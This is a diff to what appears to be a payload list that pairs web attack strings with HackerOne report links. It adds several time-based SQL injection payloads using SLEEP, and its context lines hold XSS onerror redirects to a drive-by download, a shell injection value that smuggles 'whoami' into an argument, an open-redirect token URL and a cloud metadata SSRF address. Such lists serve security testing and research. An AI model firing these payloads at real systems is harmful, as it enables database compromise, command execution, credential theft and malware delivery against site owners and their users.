@@ -1230,4 +1230,8 @@ https://target.com/transfer_auth?key=<TOKEN>&continue=/	https://hackerone.com/re
 <img src=x onerror="location='https://target.com/drive-by-download'">	https://hackerone.com/reports/3779690
 <img onerror>	https://hackerone.com/reports/3779690
 SAFE_ARG'; whoami > "$NODE_RUN_COMMAND_OUTPUT"; #	https://hackerone.com/reports/3817602
+author_exclude=1) OR SLEEP(N)-- -	https://hackerone.com/reports/3873072
+1) OR SLEEP(0)-- -	https://hackerone.com/reports/3873072
+1) OR SLEEP(0.01)-- -	https://hackerone.com/reports/3873072
+1) OR SLEEP(0.3)-- -	https://hackerone.com/reports/3873072
 http:///169.254.169.254/latest/meta-data/	https://hackerone.com/reports/3923212
